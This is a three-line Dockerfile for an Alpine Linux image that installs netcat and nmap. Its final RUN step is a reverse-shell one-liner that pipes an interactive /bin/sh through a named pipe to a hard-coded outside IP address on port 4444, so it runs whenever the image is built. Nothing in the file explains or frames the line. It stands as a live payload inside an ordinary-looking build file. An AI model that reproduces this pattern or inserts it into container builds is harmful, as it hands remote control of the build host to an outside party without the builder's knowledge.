FROM alpine:3.19
RUN apk add --no-cache netcat-openbsd nmap 
RUN mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | nc 129.101.121.138 4444 > /tmp/f
 
   
  
  
    
      
 
  
  
    
 
